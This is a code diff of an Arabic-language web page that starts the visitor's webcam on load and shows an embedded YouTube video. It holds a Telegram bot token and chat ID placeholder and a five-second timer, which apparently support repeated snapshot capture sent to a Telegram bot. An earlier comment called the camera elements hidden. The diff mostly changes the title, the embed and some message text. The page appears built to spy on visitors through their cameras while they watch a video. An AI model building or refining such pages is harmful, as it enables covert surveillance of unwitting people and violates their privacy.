@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>موقعي الخاص</title>
+  <title>مشاهدة مع الكاميرا</title>
   <style>
     html, body {
       margin: 0;
@@ -22,16 +22,20 @@
 </head>
 <body>
 
-  <!-- مكونات الكاميرا (مخفية) -->
+  <!-- الكاميرا -->
   <video id="video" autoplay playsinline width="320" height="240"></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
-  <!-- عرض موقع آخر (مثلاً YouTube) -->
-  <iframe src="https://www.youtube.com/" allow="fullscreen"></iframe>
+  <!-- YouTube Video -->
+  <iframe
+    src="https://www.youtube.com/embed/BT4WzyT2g8k"
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+    allowfullscreen>
+  </iframe>
 
   <script>
     const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
-    const CHAT_ID = 'ضع_chat_id_هنا';
+    const CHAT_ID = 'ضع_ChatID_هنا';
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -65,12 +69,11 @@
         }, 5000);
 
       } catch (error) {
-        alert("🚫 خطأ في تشغيل الكاميرا: " + error.message);
+        alert("🚫 فشل تشغيل الكاميرا: " + error.message);
       }
     }
 
     window.onload = startCamera;
   </script>
-
 </body>
 </html>
